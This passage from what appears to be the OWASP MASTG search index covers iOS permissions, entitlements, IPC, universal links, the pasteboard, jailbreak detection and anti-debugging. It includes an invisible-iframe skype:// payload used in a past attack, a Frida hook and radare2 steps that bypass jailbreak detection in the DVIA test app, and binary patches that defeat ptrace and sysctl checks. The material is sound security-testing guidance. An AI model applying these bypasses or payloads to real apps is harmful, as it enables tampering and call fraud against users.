JavaScript objects into native Objective-C or Swift objects. Message handlers are configured using the method <code>add(_ scriptMessageHandler:name:)</code>.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0077/","title":"MASTG-KNOW-0077: App Permissions","text":"<p>In contrast to Android, where each app runs on its own user ID, iOS makes all third-party apps run under the non-privileged <code>mobile</code> user. Each app has a unique home directory and is sandboxed, so that they cannot access protected system resources or files stored by the system or by other apps. These restrictions are implemented via sandbox policies (aka. profiles), which are enforced by the Trusted BSD (MAC) Mandatory Access Control Framework via a kernel extension. iOS applies a generic sandbox profile to all third-party apps called container. Access to protected resources or data (some also known as app capabilities) is possible, but it's strictly controlled via special permissions known as entitlements.</p> <p>Some permissions can be configured by the app's developers (e.g. Data Protection or Keychain Sharing) and will directly take effect after the installation. However, for others, the user will be explicitly asked the first time the app attempts to access a protected resource, for example:</p> <ul> <li>Bluetooth peripherals</li> <li>Calendar data</li> <li>Camera</li> <li>Contacts</li> <li>Health sharing</li> <li>Health updating</li> <li>HomeKit</li> <li>Location</li> <li>Microphone</li> <li>Motion</li> <li>Music and the media library</li> <li>Photos</li> <li>Reminders</li> <li>Siri</li> <li>Speech recognition</li> <li>the TV provider</li> </ul> <p>Even though Apple urges to protect the privacy of the user and to be very clear on how to ask permissions, it can still be the case that an app requests too many of them for non-obvious reasons.</p> <p>Verifying the use of some permissions such as Camera, Photos, Calendar Data, Motion, Contacts or Speech Recognition should be pretty straightforward as it should be obvious if the app requires them to fulfill its tasks. Let's consider the following examples regarding the Photos permission, which, if granted, gives the app access to all user photos in the \"Camera Roll\" (the iOS default system-wide location for storing photos):</p> <ul> <li>The typical QR Code scanning app obviously requires the camera to function but might be requesting the photos permission as well. If storage is explicitly required, and depending on the sensitivity of the pictures being taken, these apps might better opt to use the app sandbox storage to avoid other apps (having the photos permission) to access them. See the chapter \"Data Storage on iOS\" for more information regarding storage of sensitive data.</li> <li>Some apps require photo uploads (e.g. for profile pictures). Recent versions of iOS introduce new APIs such as <code>UIImagePickerController</code> (iOS 11+) and its modern replacement <code>PHPickerViewController</code> (iOS 14+). These APIs run on a separate process from your app and by using them, the app gets read-only access exclusively to the images selected by the user instead of to the whole \"Camera Roll\". This is considered a best practice to avoid requesting unnecessary permissions.</li> </ul> <p>Verifying other permissions like Bluetooth or Location require a deeper source code inspection. They may be required for the app to properly function but the data being handled by those tasks might not be properly protected.</p> <p>When collecting or simply handling (e.g. caching) sensitive data, an app should provide proper mechanisms to give the user control over it, e.g. to be able to revoke access or to delete it. However, sensitive data might not only be stored or cached but also sent over the network. In both cases, it has to be ensured that the app properly follows the appropriate best practices, which in this case involve implementing proper data protection and transport security. More information on how to protect this kind of data can be found in the chapter \"Network APIs\".</p> <p>As you can see, using app capabilities and permissions mostly involve handling personal data, therefore being a matter of protecting the user's privacy. See the articles \"Protecting the User's Privacy\" and \"Accessing Protected Resources\" in Apple Developer Documentation for more details.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0077/#device-capabilities","title":"Device Capabilities","text":"<p>Device capabilities are used by the App Store to ensure that only compatible devices are listed and therefore are allowed to download the app. They are specified in the <code>Info.plist</code> file of the app under the <code>UIRequiredDeviceCapabilities</code> key.</p> <pre><code>&lt;key&gt;UIRequiredDeviceCapabilities&lt;/key&gt;\n&lt;array&gt;\n    &lt;string&gt;arm64&lt;/string&gt;\n&lt;/array&gt;\n</code></pre> <p>Typically you'll find the <code>arm64</code> capability, meaning that the app is compiled for the arm64 instruction set.</p> <p>For example, an app might be completely dependent on NFC to work (e.g. a \"NFC Tag Reader\" app). According to the archived iOS Device Compatibility Reference, NFC is only available starting on the iPhone 7 (and iOS 11). A developer might want to exclude all incompatible devices by setting the <code>nfc</code> device capability.</p> <p>Regarding testing, you can consider <code>UIRequiredDeviceCapabilities</code> as a mere indication that the app is using some specific resources. Unlike the entitlements related to app capabilities, device capabilities do not confer any right or access to protected resources. Additional configuration steps might be required for that, which are very specific to each capability.</p> <p>For example, if BLE is a core feature of the app, Apple's Core Bluetooth Programming Guide explains the different things to be considered:</p> <ul> <li>The <code>bluetooth-le</code> device capability can be set in order to restrict non-BLE capable devices from downloading their app.</li> <li>App capabilities like <code>bluetooth-peripheral</code> or <code>bluetooth-central</code> (both <code>UIBackgroundModes</code>) should be added if BLE background processing is required.</li> </ul> <p>However, this is not yet enough for the app to get access to the Bluetooth peripheral, the <code>NSBluetoothPeripheralUsageDescription</code> key has to be included in the <code>Info.plist</code> file, meaning that the user has to actively give permission. See \"Purpose Strings in the Info.plist File\" below for more information.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0077/#entitlements","title":"Entitlements","text":"<p>According to Apple's iOS Security Guide:</p> <p>Entitlements are key value pairs that are signed in to an app and allow authentication beyond runtime factors, like UNIX user ID. Since entitlements are digitally signed, they can't be changed. Entitlements are used extensively by system apps and daemons to perform specific privileged operations that would otherwise require the process to run as root. This greatly reduces the potential for privilege escalation by a compromised system app or daemon.</p> <p>Many entitlements can be set using the \"Summary\" tab of the Xcode target editor. Other entitlements require editing a target's entitlements property list file or are inherited from the iOS provisioning profile used to run the app.</p> <p>Entitlement Sources:</p> <ol> <li>Entitlements embedded in a provisioning profile that is used to code sign the app, which are composed of:</li> <li>Capabilities defined on the Xcode project's target Capabilities tab, and/or:</li> <li>Enabled Services on the app's App ID which are configured on the Identifiers section of the Certificates, ID's and Profiles website.</li> <li>Other entitlements that are injected by the profile generation service.</li> <li>Entitlements from a code signing entitlements file.</li> </ol> <p>Entitlement Destinations:</p> <ol> <li>The app's signature.</li> <li>The app's embedded provisioning profile.</li> </ol> <p>The Apple Developer Documentation also explains:</p> <ul> <li>During code signing, the entitlements corresponding to the app's enabled Capabilities/Services are transferred to the app's signature from the provisioning profile Xcode chose to sign the app.</li> <li>The provisioning profile is embedded into the app bundle during the build (<code>embedded.mobileprovision</code>).</li> <li>Entitlements from the \"Code Signing Entitlements\" section in Xcode's \"Build Settings\" tab are transferred to the app's signature.</li> </ul> <p>For example, if you want to set the \"Default Data Protection\" capability, you would need to go to the Capabilities tab in Xcode and enable Data Protection. This is directly written by Xcode to the <code>&lt;appname&gt;.entitlements</code> file as the <code>com.apple.developer.default-data-protection</code> entitlement with default value <code>NSFileProtectionComplete</code>. In the IPA we might find this in the <code>embedded.mobileprovision</code> as:</p> <pre><code>&lt;key&gt;Entitlements&lt;/key&gt;\n&lt;dict&gt;\n    ...\n    &lt;key&gt;com.apple.developer.default-data-protection&lt;/key&gt;\n    &lt;string&gt;NSFileProtectionComplete&lt;/string&gt;\n&lt;/dict&gt;\n</code></pre> <p>For other capabilities such as HealthKit, the user has to be asked for permission, therefore it is not enough to add the entitlements, special keys and strings have to be added to the <code>Info.plist</code> file of the app.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0077/#purpose-strings-in-the-infoplist-file","title":"Purpose Strings in the Info.plist File","text":"<p>Purpose strings or_usage description strings_ are custom texts that are offered to users in the system's permission request alert when requesting permission to access protected data or resources.</p> <p></p> <p>If linking on or after iOS 10, developers are required to include purpose strings in their app's <code>Info.plist</code> file. Otherwise, if the app attempts to access protected data or resources without having provided the corresponding purpose string, the access will fail and the app might even crash.</p> <p>For an overview of the different purpose strings Info.plist keys available see Table 1-2 at the Apple App Programming Guide for iOS. Click on the provided links to see the full description of each key in the CocoaKeys reference.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0077/#code-signing-entitlements-file","title":"Code Signing Entitlements File","text":"<p>Certain capabilities require a code signing entitlements file (<code>&lt;appname&gt;.entitlements</code>). It is automatically generated by Xcode but may be manually edited and/or extended by the developer as well.</p> <p>Here is an example of entitlements file of the open source app Telegram including the App Groups entitlement (<code>application-groups</code>):</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n...\n    &lt;key&gt;com.apple.security.application-groups&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;group.ph.telegra.Telegraph&lt;/string&gt;\n    &lt;/array&gt;\n&lt;/dict&gt;\n...\n&lt;/plist&gt;\n</code></pre> <p>The entitlement outlined above does not require any additional permissions from the user. However, it is always a good practice to check all entitlements, as the app might overask the user in terms of permissions and thereby leak information.</p> <p>As documented at Apple Developer Documentation, the App Groups entitlement is required to share information between different apps through IPC or a shared file container, which means that data can be shared on the device directly between the apps. This entitlement is also required if an app extension requires to share information with its containing app.</p> <p>Depending on the data to-be-shared it might be more appropriate to share it using another method such as through a backend where this data could be potentially verified, avoiding tampering by e.g. the user themselves.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0078/","title":"MASTG-KNOW-0078: Inter-Process Communication (IPC)","text":"<p>During implementation of a mobile application, developers may apply traditional techniques for IPC (such as using shared files or network sockets). The IPC system functionality offered by mobile application platforms should be used because it is much more mature than traditional techniques. Using IPC mechanisms with no security in mind may cause the application to leak or expose sensitive data.</p> <p>In contrast to Android's rich Inter-Process Communication (IPC) capability, iOS offers some rather limited options for communication between apps. In fact, there's no way for apps to communicate directly. In this section we will present the different types of indirect communication offered by iOS and how to test them. Here's an overview:</p> <ul> <li>Custom URL Schemes</li> <li>Universal Links</li> <li>UIActivity Sharing</li> <li>App Extensions</li> <li>UIPasteboard</li> </ul>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0079/","title":"MASTG-KNOW-0079: Custom URL Schemes","text":"<p>Custom URL schemes allow apps to communicate via a custom protocol. An app must declare support for the schemes and handle incoming URLs that use those schemes.</p> <p>Apple warns about the improper use of custom URL schemes in the Apple Developer Documentation:</p> <p>URL schemes offer a potential attack vector into your app, so make sure to validate all URL parameters and discard any malformed URLs. In addition, limit the available actions to those that do not risk the user's data. For example, do not allow other apps to directly delete content or access sensitive information about the user. When testing your URL-handling code, make sure your test cases include improperly formatted URLs.</p> <p>They also suggest using universal links instead, if the purpose is to implement deep linking:</p> <p>While custom URL schemes are an acceptable form of deep linking, universal links are strongly recommended as a best practice.</p> <p>Supporting a custom URL scheme is done by:</p> <ul> <li>defining the format for the app's URLs,</li> <li>registering the scheme so that the system directs appropriate URLs to the app,</li> <li>handling the URLs that the app receives.</li> </ul> <p>Security issues arise when an app processes calls to its URL scheme without properly validating the URL and its parameters and when users aren't prompted for confirmation before triggering an important action.</p> <p>One example is the following bug in the Skype Mobile app, discovered in 2010: The Skype app registered the <code>skype://</code> protocol handler, which allowed other apps to trigger calls to other Skype users and phone numbers. Unfortunately, Skype didn't ask users for permission before placing the calls, so any app could call arbitrary numbers without the user's knowledge. Attackers exploited this vulnerability by putting an invisible <code>&lt;iframe src=\"skype://xxx?call\"&gt;&lt;/iframe&gt;</code> (where <code>xxx</code> was replaced by a premium number), so any Skype user who inadvertently visited a malicious website called the premium number.</p> <p>As a developer, you should carefully validate any URL before calling it. You can allow only certain applications which may be opened via the registered protocol handler. Prompting users to confirm the URL-invoked action is another helpful control.</p> <p>All URLs are passed to the app delegate, either at launch time or while the app is running or in the background. To handle incoming URLs, the delegate should implement methods to:</p> <ul> <li>retrieve information about the URL and decide whether you want to open it,</li> <li>open the resource specified by the URL.</li> </ul> <p>More information can be found in the archived App Programming Guide for iOS and in the Apple Secure Coding Guide.</p> <p>In addition, an app may also want to send URL requests (aka. queries) to other apps. This is done by:</p> <ul> <li>registering the application query schemes that the app wants to query,</li> <li>optionally querying other apps to know if they can open a certain URL,</li> <li>sending the URL requests.</li> </ul>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0080/","title":"MASTG-KNOW-0080: Universal Links","text":"<p>Universal links are the iOS equivalent to Android App Links (aka. Digital Asset Links) and are used for deep linking. When tapping a universal link (to the app's website), the user will seamlessly be redirected to the corresponding installed app without going through Safari. If the app isn't installed, the link will open in Safari.</p> <p>Universal links are standard web links (HTTP/HTTPS) and are not to be confused with custom URL schemes, which originally were also used for deep linking.</p> <p>For example, the Telegram app supports both custom URL schemes and universal links:</p> <ul> <li><code>tg://resolve?domain=fridadotre</code> is a custom URL scheme and uses the <code>tg://</code> scheme.</li> <li><code>https://telegram.me/fridadotre</code> is a universal link and uses the <code>https://</code> scheme.</li> </ul> <p>Both result in the same action, the user will be redirected to the specified chat in Telegram (\"fridadotre\" in this case). However, universal links give several key benefits that are not applicable when using custom URL schemes and are the recommended way to implement deep linking, according to the Apple Developer Documentation. Specifically, universal links are:</p> <ul> <li>Unique: Unlike custom URL schemes, universal links can't be claimed by other apps, because they use standard HTTP or HTTPS links to the app's website. They were introduced as a way to prevent URL scheme hijacking attacks (an app installed after the original app may declare the same scheme and the system might target all new requests to the last installed app).</li> <li>Secure: When users install the app, iOS downloads and checks a file (the Apple App Site Association or AASA) that was uploaded to the web server to make sure that the website allows the app to open URLs on its behalf. Only the legitimate owners of the URL can upload this file, so the association of their website with the app is secure.</li> <li>Flexible: Universal links work even when the app is not installed. Tapping a link to the website would open the content in Safari, as users expect.</li> <li>Simple: One URL works for both the website and the app.</li> <li>Private: Other apps can communicate with the app without needing to know whether it is installed.</li> </ul> <p>You can learn more about Universal Links in the post \"Learning about Universal Links and Fuzzing URL Schemes on iOS with Frida\" by Carlos Holguera.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0081/","title":"MASTG-KNOW-0081: UIActivity Sharing","text":"<p>Starting on iOS 6 it is possible for third-party apps to share data (items) via specific mechanisms like AirDrop, for example. From a user perspective, this feature is the well-known system-wide \"Share Activity Sheet\" that appears after clicking on the \"Share\" button.</p> <p></p> <p>The available built-in sharing mechanisms (aka. Activity Types) include:</p> <ul> <li>airDrop</li> <li>assignToContact</li> <li>copyToPasteboard</li> <li>mail</li> <li>message</li> <li>postToFacebook</li> <li>postToTwitter</li> </ul> <p>A full list can be found in UIActivity.ActivityType. If not considered appropriate for the app, the developers have the possibility to exclude some of these sharing mechanisms.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0082/","title":"MASTG-KNOW-0082: App extensions","text":"<p>Together with iOS 8, Apple introduced App Extensions. According to Apple App Extension Programming Guide, app extensions let apps offer custom functionality and content to users while they're interacting with other apps or the system. In order to do this, they implement specific, well scoped tasks like, for example, define what happens after the user clicks on the \"Share\" button and selects some app or action, provide the content for a Today widget or enable a custom keyboard.</p> <p>Depending on the task, the app extension will have a particular type (and only one), the so-called extension points. Some notable ones are:</p> <ul> <li>Custom Keyboard: replaces the iOS system keyboard with a custom keyboard for use in all apps.</li> <li>Share: post to a sharing website or share content with others.</li> <li>Today: also called widgets, they offer content or perform quick tasks in the Today view of Notification Center.</li> </ul>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0082/#how-do-app-extensions-interact-with-other-apps","title":"How do app extensions interact with other apps","text":"<p>There are three important elements here:</p> <ul> <li>App extension: is the one bundled inside a containing app. Host apps interact with it.</li> <li>Host app: is the (third-party) app that triggers the app extension of another app.</li> <li>Containing app: is the app that contains the app extension bundled into it.</li> </ul> <p>For example, the user selects text in the host app, clicks on the \"Share\" button and selects one \"app\" or action from the list. This triggers the app extension of the containing app. The app extension displays its view within the context of the host app and uses the items provided by the host app, the selected text in this case, to perform a specific task (post it on a social network, for example). See this picture from the Apple App Extension Programming Guide which pretty good summarizes this:</p> <p></p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0082/#security-considerations","title":"Security Considerations","text":"<p>From the security point of view it is important to note that:</p> <ul> <li>An app extension does never communicate directly with its containing app (typically, it isn't even running while the contained app extension is running).</li> <li>An app extension and the host app communicate via inter-process communication.</li> <li>An app extension's containing app and the host app don't communicate at all.</li> <li>A Today widget (and no other app extension type) can ask the system to open its containing app by calling the <code>openURL:completionHandler:</code> method of the <code>NSExtensionContext</code> class.</li> <li>Any app extension and its containing app can access shared data in a privately defined shared container.</li> </ul> <p>In addition:</p> <ul> <li>App extensions cannot access some APIs, for example, HealthKit.</li> <li>They cannot receive data using AirDrop but do can send data.</li> <li>No long-running background tasks are allowed but uploads or downloads can be initiated.</li> <li>App extensions cannot access the camera or microphone on an iOS device (except for iMessage app extensions).</li> </ul>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0083/","title":"MASTG-KNOW-0083: Pasteboard","text":"<p>Using the <code>UIPasteboard</code> API, apps can access the iOS pasteboard, allowing them to share data either within the app or across apps. However, the system-wide nature of the general pasteboard raises privacy and security concerns, especially when sensitive data is copied programmatically without user interaction.</p> <p>There are two types of pasteboards:</p> <ul> <li>General pasteboard (<code>UIPasteboard.general</code>): Shared across all foreground apps and, with Universal Clipboard, potentially across Apple devices. It is persistent by default across device restarts and app reinstalls unless cleared. As of iOS 16, the general pasteboard requires user interaction for access.</li> <li>Custom or Named Pasteboards (<code>UIPasteboard(name:create:)</code> and <code>UIPasteboard.withUniqueName()</code>): These are private pasteboards that are app- or team-specific, i.e., restricted to the app that created them or other apps from the same team ID. They are non-persistent by default since iOS 10 (deleted upon app termination and system reboot). Apple discourages the use of persistent custom pasteboards and recommends using App Groups for sharing data between apps of the same developer.</li> </ul> <p>The iOS pasteboard API has gone through multiple changes which can impact both the user's privacy and security:</p> <ul> <li>Since iOS 9, access to the pasteboard has been restricted to apps running in the foreground, which significantly reduces the risk of passive clipboard sniffing. However, if sensitive data remains on the pasteboard and a malicious app is brought to the foreground later (or an app widget that remains in the foreground whenever the user is on the screen where it's located), the app can access that data without the user's consent or knowledge. See the example attack.</li> <li>Since iOS 10, Universal Clipboard is enabled by default and, when a user signs into iCloud, automatically syncs the general pasteboard content across the user's nearby Apple devices using the same iCloud account. Developers can choose to disable this by restricting the contents of the general pasteboard to the local device using <code>UIPasteboard.localOnly</code>. Additionally, they may set expiration times for pasteboard items using <code>UIPasteboard.expirationDate</code>.</li> <li>Since iOS 14, the system notifies the user when an app reads general pasteboard content that was written by a different app without user intent. The system determines user intent based on user interactions, such as tapping a system-provided button or selecting Paste from the contextual menu.</li> <li>Since iOS 16, the system prompts users with a paste confirmation dialog whenever an app accesses pasteboard content. Therefore, any access to the general pasteboard must be explicitly triggered by user interaction. Apps can also use <code>UIPasteControl</code> to handle paste actions by presenting a special \"paste\" button whenever they detect compatible data. This isn't necessarily better or more secure; it's an improvement to the user experience. It avoids prompting the user every time, but the user still needs to click, so access occurs only in response to user interaction.</li> </ul>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0084/","title":"MASTG-KNOW-0084: Jailbreak Detection","text":"<p>Jailbreak detection mechanisms are added to reverse engineering defense to make running the app on a jailbroken device more difficult. This blocks some of the tools and techniques reverse engineers like to use. Like most other types of defense, jailbreak detection is not very effective by itself, but scattering checks throughout the app's source code can improve the effectiveness of the overall anti-tampering scheme.</p> <p>You can learn more about Jailbreak/Root Detection in the research study \"Jailbreak/Root Detection Evasion Study on iOS and Android\" by Dana Geist and Marat Nigmatullin.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0084/#common-jailbreak-detection-checks","title":"Common Jailbreak Detection Checks","text":"<p>Here we present three typical jailbreak detection techniques:</p> <p>File-based Checks:</p> <p>The app might be checking for files and directories typically associated with jailbreaks, such as:</p> <pre><code>/Applications/Cydia.app\n/Applications/FakeCarrier.app\n/Applications/Icy.app\n/Applications/IntelliScreen.app\n/Applications/MxTube.app\n/Applications/RockApp.app\n/Applications/SBSettings.app\n/Applications/WinterBoard.app\n/Applications/blackra1n.app\n/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist\n/Library/MobileSubstrate/DynamicLibraries/Veency.plist\n/Library/MobileSubstrate/MobileSubstrate.dylib\n/System/Library/LaunchDaemons/com.ikey.bbot.plist\n/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist\n/bin/bash\n/bin/sh\n/etc/apt\n/etc/ssh/sshd_config\n/private/var/lib/apt\n/private/var/lib/cydia\n/private/var/mobile/Library/SBSettings/Themes\n/private/var/stash\n/private/var/tmp/cydia.log\n/var/tmp/cydia.log\n/usr/bin/sshd\n/usr/libexec/sftp-server\n/usr/libexec/ssh-keysign\n/usr/sbin/sshd\n/var/cache/apt\n/var/lib/apt\n/var/lib/cydia\n/usr/sbin/frida-server\n/usr/bin/cycript\n/usr/local/bin/cycript\n/usr/lib/libcycript.dylib\n/var/log/syslog\n</code></pre> <p>Checking File Permissions:</p> <p>The app might be trying to write to a location that's outside the application's sandbox. For instance, it may attempt to create a file in, for example, the <code>/private</code> directory. If the file is created successfully, the app can assume that the device has been jailbroken.</p> <pre><code>do {\n    let pathToFileInRestrictedDirectory = \"/private/jailbreak.txt\"\n    try \"This is a test.\".write(toFile: pathToFileInRestrictedDirectory, atomically: true, encoding: String.Encoding.utf8)\n    try FileManager.default.removeItem(atPath: pathToFileInRestrictedDirectory)\n    // Device is jailbroken\n} catch {\n    // Device is not jailbroken\n}\n</code></pre> <p>Checking Protocol Handlers:</p> <p>The app might be attempting to call well-known protocol handlers such as <code>cydia://</code> (available by default after installing  Cydia).</p> <pre><code>if let url = URL(string: \"cydia://package/com.example.package\"), UIApplication.shared.canOpenURL(url) {\n    // Device is jailbroken\n}\n</code></pre>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0084/#automated-jailbreak-detection-bypass","title":"Automated Jailbreak Detection Bypass","text":"<p>The quickest way to bypass common Jailbreak detection mechanisms is  objection. You can find the implementation of the jailbreak bypass in the jailbreak.ts script.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0084/#manual-jailbreak-detection-bypass","title":"Manual Jailbreak Detection Bypass","text":"<p>If the automated bypasses aren't effective you need to get your hands dirty and reverse engineer the app binaries until you find the pieces of code responsible for the detection and either patch them statically or apply runtime hooks to disable them.</p> <p>Step 1: Reverse Engineering:</p> <p>When you need to reverse engineer a binary looking for jailbreak detection, the most obvious way is to search for known strings, such as \"jail\" or \"jailbreak\". Note that this won't be always effective, especially when resilience measures are in place or simply when the the developer has avoided such obvious terms.</p> <p>Example: Download the  DVIA-v2, unzip it, load the main binary into  radare2 for iOS and wait for the analysis to complete.</p> <pre><code>r2 -A ./DVIA-v2-swift/Payload/DVIA-v2.app/DVIA-v2\n</code></pre> <p>Now you can list the binary's symbols using the <code>is</code> command and apply a case-insensitive grep (<code>~+</code>) for the string \"jail\".</p> <pre><code>[0x1001a9790]&gt; is~+jail\n...\n2230  0x001949a8 0x1001949a8 GLOBAL FUNC 0        DVIA_v2.JailbreakDetectionViewController.isJailbroken.allocator__Bool\n7792  0x0016d2d8 0x10016d2d8 LOCAL  FUNC 0        +[JailbreakDetection isJailbroken]\n...\n</code></pre> <p>As you can see, there's an instance method with the signature <code>-[JailbreakDetectionVC isJailbroken]</code>.</p> <p>Step 2: Dynamic Hooks:</p> <p>Now you can use Frida to bypass jailbreak detection by performing the so-called early instrumentation, that is, by replacing function implementation right at startup.</p> <p>Use <code>frida-trace</code> on your host computer:</p> <pre><code>frida-trace -U -f /Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp  -m \"-[JailbreakDetectionVC isJailbroken]\"\n</code></pre> <p>This will start the app, trace calls to <code>-[JailbreakDetectionVC isJailbroken]</code>, and create a JavaScript hook for each matching element. Open <code>./__handlers__/__JailbreakDetectionVC_isJailbroken_.js</code> with your favouritte editor and edit the <code>onLeave</code> callback function. You can simply replace the return value using <code>retval.replace()</code> to always return <code>0</code>:</p> <pre><code>onLeave: function (log, retval, state) {\n    console.log(\"Function [JailbreakDetectionVC isJailbroken] originally returned:\"+ retval);\n    retval.replace(0);\n    console.log(\"Changing the return value to:\"+retval);\n}\n</code></pre> <p>This will provide the following output:</p> <pre><code>$ frida-trace -U -f /Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp  -m \"-[JailbreakDetectionVC isJailbroken]:\"\n\nInstrumenting functions...                                           `...\n-[JailbreakDetectionVC isJailbroken]: Loaded handler at \"./__handlers__/__JailbreakDetectionVC_isJailbroken_.js\"\nStarted tracing 1 function. Press Ctrl+C to stop.\n\nFunction [JailbreakDetectionVC isJailbroken] originally returned:0x1\nChanging the return value to:0x0\n</code></pre>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0085/","title":"MASTG-KNOW-0085: Anti-Debugging Detection","text":"<p>Exploring applications using a debugger is a very powerful technique during reversing. You can not only track variables containing sensitive data and modify the control flow of the application, but also read and modify memory and registers.</p> <p>There are several anti-debugging techniques applicable to iOS which can be categorized as preventive or as reactive. When properly distributed throughout the app, these techniques act as a supportive measure to increase the overall resilience.</p> <ul> <li>Preventive techniques act as a first line of defense to impede the debugger from attaching to the application at all.</li> <li>Reactive techniques allow the application to detect the presence of a debugger and have a chance to diverge from normal behavior.</li> </ul>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0085/#using-ptrace","title":"Using ptrace","text":"<p>As seen in  Debugging, the iOS XNU kernel implements a <code>ptrace</code> system call that's lacking most of the functionality required to properly debug a process (e.g. it allows attaching/stepping but not read/write of memory and registers).</p> <p>Nevertheless, the iOS implementation of the <code>ptrace</code> syscall contains a nonstandard and very useful feature: preventing the debugging of processes. This feature is implemented as the <code>PT_DENY_ATTACH</code> request, as described in the official BSD System Calls Manual. In simple words, it ensures that no other debugger can attach to the calling process; if a debugger attempts to attach, the process will terminate. Using <code>PT_DENY_ATTACH</code> is a fairly well-known anti-debugging technique, so you may encounter it often during iOS pentests.</p> <p>Before diving into the details, it is important to know that <code>ptrace</code> is not part of the public iOS API. Non-public APIs are prohibited, and the App Store may reject apps that include them. Because of this, <code>ptrace</code> is not directly called in the code; it's called when a <code>ptrace</code> function pointer is obtained via <code>dlsym</code>.</p> <p>The following is an example implementation of the above logic:</p> <pre><code>#import &lt;dlfcn.h&gt;\n#import &lt;sys/types.h&gt;\n#import &lt;stdio.h&gt;\ntypedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);\nvoid anti_debug() {\n  ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(RTLD_SELF, \"ptrace\");\n  ptrace_ptr(31, 0, 0, 0); // PTRACE_DENY_ATTACH = 31\n}\n</code></pre> <p>Bypass: To demonstrate how to bypass this technique we'll use an example of a disassembled binary that implements this approach:</p> <p></p> <p>Let's break down what's happening in the binary. <code>dlsym</code> is called with <code>ptrace</code> as the second argument (register R1). The return value in register R0 is moved to register R6 at offset 0x1908A. At offset 0x19098, the pointer value in register R6 is called using the BLX R6 instruction. To disable the <code>ptrace</code> call, we need to replace the instruction <code>BLX R6</code> (<code>0xB0 0x47</code> in Little Endian) with the <code>NOP</code> (<code>0x00 0xBF</code> in Little Endian) instruction. After patching, the code will be similar to the following:</p> <p></p> <p>Armconverter.com is a handy tool for conversion between bytecode and instruction mnemonics.</p> <p>Bypasses for other ptrace-based anti-debugging techniques can be found in \"Defeating Anti-Debug Techniques: macOS ptrace variants\" by Alexander O'Mara.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0085/#using-sysctl","title":"Using sysctl","text":"<p>Another approach to detecting a debugger that's attached to the calling process involves <code>sysctl</code>. According to the Apple documentation, it allows processes to set system information (if having the appropriate privileges) or simply to retrieve system information (such as whether or not the process is being debugged). However, note that just the fact that an app uses <code>sysctl</code> might be an indicator of anti-debugging controls, though this won't be always be the case.</p> <p>The Apple Documentation Archive includes an example which checks the <code>info.kp_proc.p_flag</code> flag returned by the call to <code>sysctl</code> with the appropriate parameters. According to Apple, you shouldn't use this code unless it's for the debug build of your program.</p> <p>Bypass: One way to bypass this check is by patching the binary. When the code above is compiled, the disassembled version of the second half of the code is similar to the following:</p> <p></p> <p>After the instruction at offset 0xC13C, <code>MOVNE R0, #1</code> is patched and changed to <code>MOVNE R0, #0</code> (0x00 0x20 in in bytecode), the patched code is similar to the following:</p> <p></p> <p>You can also bypass a <code>sysctl</code> check by using the debugger itself and setting a breakpoint at the call to <code>sysctl</code>. This approach is demonstrated in iOS Anti-Debugging Protections #2.</p>","tags":["ios","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/ios/MASVS-RESILIENCE/MASTG-KNOW-0085/#using-getppid","title":"Using getppid","text":"<p>Applications on iOS can detect if they have been started by a debugger by checking their parent PID. Normally, an application is started by the launchd process, which is the first process running in the user mode and has PID=1. However, if a debugger starts an application, we can observe that <code>getppid</code> returns a PID different than <code>1</code>. This detection technique can be implemented in native code (via syscalls), using 